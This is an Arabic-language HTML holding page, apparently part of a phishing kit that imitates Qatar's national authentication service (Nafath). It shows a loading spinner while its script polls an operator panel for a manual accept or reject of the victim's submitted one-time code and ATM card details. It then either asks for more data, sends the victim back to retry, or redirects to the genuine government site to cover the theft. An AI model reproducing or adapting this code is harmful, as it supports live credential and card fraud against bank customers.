<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري المعالجة...</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .loader-content { text-align: center; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #003e7e; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #003e7e; font-weight: bold; font-size: 18px; }
    </style>
</head>
<body>
    <div class="loader-content">
        <div class="spinner"></div>
        <p>جاري معالجة الطلب، يرجى الانتظار...</p>
    </div>

    <script>
        // دالة تفحص القرار من لوحة التحكم
        function checkDecision() {
            // نرسل اسم الصفحة التي أتى منها العميل لنعرف أي قرار ننتظر
            const fromPage = new URLSearchParams(window.location.search).get('from');
            
            fetch(`check_admin_decision.php?step=${fromPage}`)
            .then(res => res.json())
            .then(data => {
                if (data.status === 'accept') {
                    if (fromPage === 'otp') window.location.href = 'atm.html';
                    else if (fromPage === 'atm') window.location.href = 'https://www.nas.gov.qa/'; // موقع النفاذ الأصلي
                } else if (data.status === 'reject') {
                    window.location.href = fromPage + '.html?error=1';
                }
            });
        }
        setInterval(checkDecision, 3000); // فحص كل 3 ثوانٍ
    </script>
</body>
</html>
